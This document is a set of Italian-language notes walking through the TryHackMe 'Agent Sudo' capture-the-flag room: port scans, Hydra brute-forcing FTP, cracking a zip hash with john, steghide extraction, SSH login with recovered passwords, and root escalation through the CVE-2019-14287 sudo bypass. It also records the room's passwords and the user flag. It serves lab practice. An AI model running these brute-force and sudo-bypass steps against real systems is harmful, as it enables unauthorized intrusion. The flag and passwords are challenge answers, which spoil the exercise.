
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/agentsudoctf

```
sudo nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.10.56.42 -oG risultatoscan
```

```
sudo nmap -sC -sV -p21,80,22,52263 10.10.56.42 -oN risultatoscan2
```

http://10.10.56.42/

==user-agent== per accedere alle pagine web segrete

trovare con burpsuite un user agent valido dandogli in pasto una lista 
```bash
burpsuite &> /dev/null & disown
```
trovata la lettera
```
C
```

SEND al Response o Browser

```
Attention chris,  
  
Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!  
  
From,  
Agent R
```

```shell
hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.56.42 ftp
```
trovata password:
```
crystal
```

```
ftp 10.10.217.213
```

```
chris
```

```
less To_agentJ.txt
```

```
mget cute-alien.jpg
```

```
mget cutie.png
```

```
exiftool /home/kali/cutie.png
```
analizziamo stenografia del file
```
binwalk /home/kali/cute-alien.jpg
```

```
binwalk -e /home/kali/cute-alien.jpg
```

```
cd _cutie.png.extracted
```

```
7z x 8702.zip
```
ci chiede pw che non abbiamo
==creiamo un hash del file zip==
```
zip2john 8702.zip > zip_hash
```

```
john zip_hash
```
trovata la password
```
alien
```

```
7z x 8702.zip
```

```
cat To_agentR.txt
```

```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```
QXJlYTUx è codificata in base64 la decodifichiamo (volendo anche su sito)
https://gchq.github.io/CyberChef/
```
echo 'QXJlYTUx' | base64 -d
```
troviamo
```
Area51
```
==installiamo==
```
steghide
```

```
cd ..
```
estraiamo dal file stenografato
```
steghide extract -sf cute-alien.jpg
```

```
cat message.txt  
```

```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

```
hackerrules!
```

```
ssh james@10.10.217.213
```

```
cat user_flag.txt
```

```
b03d975e8c92a7c04146cfa7a5a313c7
```
==scarichiamo da remoto con scp==
```
scp james@10.10.217.213:"/home/james/Alien_autospy.jpg" "$HOME"
```

==se no si può fare lo facciamo con python==
tiriamo su un server su macchina vittima
```
python3 -m http.server
```
e dalla nostra
```
wget http://10.10.217.213:8000/Alien_autospy.jpg
```
ricerca su fox news online 
```
Roswell alien autopsy
```
==ora scalata dei privilegi su james==

```
sudo -l
```

```
hackerrules!
```

```
(ALL, !root) /bin/bash
```
	(cerchiamo su google)
```
sudo --version
```
troviamo
```
CVE-2019-14287
```
exploit
```
sudo -u#-1 /bin/bash
```

```
cd root
```

```
cd /root
```

```
cat root.txt
```
flag!
```
b53xxxxxxxxxxxxxxxxxxxx
```

```
DesKel
```
